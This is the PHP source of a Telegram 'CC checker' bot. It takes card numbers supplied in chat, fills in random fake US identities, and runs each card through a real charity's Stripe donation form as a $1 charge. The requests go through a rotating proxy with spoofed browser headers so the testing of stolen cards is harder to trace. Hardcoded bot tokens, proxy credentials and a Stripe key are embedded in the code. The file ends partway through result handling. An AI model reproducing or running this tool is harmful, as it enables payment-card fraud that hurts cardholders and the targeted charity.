<?php
//https://api.telegram.org/bot6821172609:AAHGRpH91lhO2jnqC7MnAywze09usB_L1x4/setwebhook?url=https://noghtshades.org/bot.php


$botToken = "6585083825:AAHFx2Dlo5P-6u744-pysmodfkPn-ePAxIU"; #<------------------- PUT YOUR TOKEN HERE------------->#
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//================[Start Command]================//

if ((strpos($message, "/start") === 0)||(strpos($message, "/start") === 0)){
sendMessage ($chatId, "<b>Hello @$username !! Check my commands by entering /cmds</b>", $message_id);
}

//=============[Command Section]============//

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "GATEWAYS%0A%0A<b>STRIPE</b> [CVV/CCN] <code>/chk cc|mm|yy|cvv</code>%0A✅STATUS :- LIVE%0A%0A<b>SK [LIVE]</b> <code>/key sk_live</code>%0A✅STATUS :- LIVE%0A%0A<b>INFO</b> /info %0A✅STATUS :- LIVE%0A%0A<b>BIN [CHECK]</b> <code>/bin xxxxxx</code>%0A✅STATUS :- LIVE%0A%0ABOT MADE BY:- <b><i>[🇮🇳] @badboychx</i></b>");
}

//=========[Bin Command]=========//


elseif ((strpos($message, "/bin $bin") === 0)||(strpos($message, "!bin $bin") === 0)||(strpos($message, ".bin $bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$bin = substr("$bin", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
};
sendMessage($chatId, '<b>🟢Valid Bin :- </b>'.$bin.'%0A<b>✦ Bank:</b> '.$bank.'%0A<b>✦ Country:</b> '.$name.''.$emoji.'%0A<b>✦ Brand:</b> '.$brand.'%0A<b>✦ Card:</b> '.$scheme.'%0A<b>✦ Type:</b> '.$type.'%0A<b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>✦ CHECKED BY -</b>: @'.$username.'%0A<b>✦ BOT BY</b>:<a> [🇮🇳]@badboychx</a>', $message_id);
}
//=========[Bin Command-END]=========//


//=========[Info Command]=========//

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "✦ Chat [ID]: <code>$chatId</code>%0A✦ Name: $firstname%0A✦ Username: @$username%0A%0A✦<b>Bot Made by: [🇮🇳]@badboychx </b>");
}
//=========[Info Command-END]=========//

//=========[ID Command]=========//

elseif ((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)){
sendMessage($chatId, "<b>This chat's ID is:</b> <code>$chatId</code>");
}
//=========[ID]=========//
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();



//=================================================RANDOM USER AGENT=====================================================//


if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

//=======================[Proxys]=============================//


//================= [ CURL REQUESTS ] =================//    
#-------------------[1st REQ]--------------------#
 
$curl = curl_init('http://ipv4.webshare.io/'); curl_setopt($curl, CURLOPT_PROXY, 'rp.proxyscrape.com:6060'); 
curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'oj7vao4hgxl84wl-country-us-state-newyork:8fal3azz1l2f16f'); curl_exec($curl);

//================= [ CURL REQUESTS ] =================//    
#-------------------[1st REQ]--------------------#
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.cardus.ca/donate-usa/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Connection: keep-alive',
'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZorNB8ZpoMmY6jEb',
//'Cookie: __stripe_mid=5a132524-d548-479e-8c99-0fa29544014f6dd9ab; __stripe_sid=4629e271-1116-4378-a862-23d4acd177b74ef4f1',
'Origin: https://www.cardus.ca',
'Pragma: no-cache',
'Referer: https://www.cardus.ca/donate-usa/',
'Sec-Fetch-Dest: iframe',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-User: ?1',
'Upgrade-Insecure-Requests: 1',
'User-Agent: '.$ua.'',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Linux"',
));
$r1 = curl_exec($ch);
$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_6' value='","'")));
$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 

//echo $nonce;
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'user-agent: '.$ua.'',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
///&card[cvc]='.$cvv.'
////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F5b3940e88a%3B+stripe-js-v3%2F5b3940e88a%3B+card-element&referrer=https%3A%2F%2Fwww.cardus.ca&time_on_page=378957&key=pk_live_51MpErQICEfV4a1tnq50TLpQXF4Dn0qnK81VYdJhSlrJeHqqbc2uzCrr8eQh9oYGIUO8albXGk8xYg0pkseoTABFO00leESyY1B');

 $result1 = curl_exec($ch);
  $l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));
  $crt = trim(strip_tags(getStr($result1,'"created": "','"')));
  $brnd = trim(strip_tags(getStr($result1,'"brand": "','"')));
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//$card = trim(strip_tags(getStr($result1,'"card": { "id": "','"')));
//echo $card;
$id;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.cardus.ca/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/javascript, */*; q=0.01',
'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
//'Cookie: __stripe_mid=5a132524-d548-479e-8c99-0fa29544014f6dd9ab; __stripe_sid=4629e271-1116-4378-a862-23d4acd177b74ef4f1',
'Origin: https://www.cardus.ca',
'Pragma: no-cache',
'Referer: https://www.cardus.ca/donate-usa/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: '.$ua.'',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Linux"',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=10080&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=Jacob+prison&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D='.$brnd.'&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D='.$brnd.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=100&feed_id=7');

$result2 = curl_exec($ch);

$pi = trim(strip_tags(getStr($result2,'"id":"','"')));
$scrt = trim(strip_tags(getStr($result2,'"client_secret":"','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.cardus.ca/donate-usa/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Connection: keep-alive',
'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynN2GZYzgvbg8BrBa',
//'Cookie: __stripe_mid=5a132524-d548-479e-8c99-0fa29544014f6dd9ab; __stripe_sid=4629e271-1116-4378-a862-23d4acd177b74ef4f1',
'Origin: https://www.cardus.ca',
'Pragma: no-cache',
'Referer: https://www.cardus.ca/donate-usa/',
'Sec-Fetch-Dest: iframe',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-User: ?1',
'Upgrade-Insecure-Requests: 1',
'User-Agent: '.$ua.'',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Linux"',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_1"

Choose custom amount
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_54"

$1.00
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_7"

Where Most Needed
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_8"

One Time
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_9"

On My Behalf
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_13"

gustavobravrii@gmail.com
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_15"


------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_45.3"

James
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_45.6"

Web
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_16"

Gandy street28
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_17"


------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_18"

New york
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_19"

New York
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_20"

10080
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_22"

14846264649
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_23"

U.S.A.
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_48.5"

Jacob prison
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_55.1"

Cardus.ca Product Name
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_55.2"

$0.00
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_55.3"

1
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="input_49"

$1.00
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="gform_ajax"

form_id=8&title=&description=&tabindex=0&theme=data-form-theme="gravity-theme"
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="is_submit_8"

1
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="gform_submit"

8
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="gform_unique_id"

65618520c4227
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="state_8"

WyJ7XCIxXCI6W1wiYjg3YWU0NmViNTg5ZWM4ODI1OTI3OTU3MDNjNjg1MmFcIixcImUzN2I3MGJhYWE5MGZlZGU0Njk1OGM1OGNmYjc2MWI1XCIsXCI1YWJmNTk5MTBlY2VkOTNiZjc2Y2ZhOGYxMTk4ZDAyMFwiLFwiZTU1MDg5OTZkODFmMTQ2YzcwYTFjNGI4MmM5MDMyN2ZcIl0sXCI3XCI6W1wiMTc3ZGIxZDFmNTIxZDhlYTFkYTNmZDcyNjk4YTM1MzZcIixcIjA2MWIxMWJjYjI5YThiOWM2NmUzNTkzMWJiYTMwZWEyXCIsXCI2MDc4MmZlZTgwZGJhOTU3YTZmMzlmOTMzMzQ4YWFlZlwiLFwiNjczMTU5OGE3MTBjNTdhNzQ5NzljNTg1MjFkYjZlN2JcIixcIjllNTRkYWExMzgwNGQ0YzU2ZmNlY2Q1N2Q4NTMyMjQ4XCIsXCJlM2Q5NjRkNmQ4YjUzOTEyMDg5NzdiYzVlZDE1MWIxOFwiLFwiOTU2N2Y2MGZlZTk0NTI4OGI1MDc2MTZhMGFiZjM2MTJcIixcIjMwN2Q0NTMwNDdmM2Y3NjI1NWRlMDg3ZGE5YTViNjI0XCIsXCI4NzM4NGZkZWYzYmM4NjViMDI1YjU2NzNmMjM4NGQ3M1wiLFwiOGFiMmVlMTNlN2NjMTU5MjM4ODM4ZTI1MDc3YzcxYjRcIixcImQ1MDdhYWUzNjhmOWQzM2M2NzdjM2NhYmE5N2U2OWMwXCIsXCI3NDIzNDZhZTkxZDI2MTdiOGQxNWY0ZmI2ZTU2Yjg2OVwiXSxcIjhcIjpbXCI3YjU0ODFlZjE1MWNmMDgxOTMzNTljNGM5MjE5YzI2OFwiLFwiZjM4NzEyNjFiMWU4YTc3YWU3OTJiYzc4NGM1ZDg5ZTVcIixcImFiM2E5Y2I4NmQ1NGNhMmMzYzZiZWUzMDc0Y2FhZDM0XCJdLFwiOVwiOltcIjI2YzM4MDkwZDMyYTBiZTM1NGExZjNhNWNkODU1NGExXCIsXCI1M2RmOTBiNzRkY2JjN2I2MjIxNmNlYWEwNDUyOGMwN1wiLFwiY2IxZDY5YWRmYjcyZTdlMzJkNjY0M2QyYzlkZDViZGVcIl0sXCIxMi4xXCI6XCI2ZjU4Yzg2YmY1NTg5OWM0YTBiMmM3OTgwYmM1N2I3MFwiLFwiMTVcIjpbXCI2OGEzNGNkODE5MTMwNzZiY2M0Y2FhZjVkZDE5MTkzOFwiLFwiNzhhMWFhNjFmYTljYWEzNjM5OTI1MTc0MGI3NmUzYzBcIixcIjEzODY1YzI0MDc0YjNlOTAyYmJmMDFhNGQyY2Q0Y2NmXCJdLFwiMjNcIjpbXCI5NWE2OTFjZDNhYWU2YTZlNTdjNWU5MjEyZDJlMWQyMFwiXX0iLCJiZGQ1M2ZmOTRkNDBmYzhjNWY2ZTc0MWRlYWM4MjA1ZCJd
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="gform_target_page_number_8"

0
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="gform_source_page_number_8"

3
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":100}
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
------WebKitFormBoundarynN2GZYzgvbg8BrBa
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundarynN2GZYzgvbg8BrBa--');

 $result3 = curl_exec($ch);
    $msg5 = trim(strip_tags(getStr($result3,'There was a problem with your submission:','.')));
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
if(empty($msg))
{
  $msg = $msg5;
}
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);
//=======================[2 REQ-END]==============================//

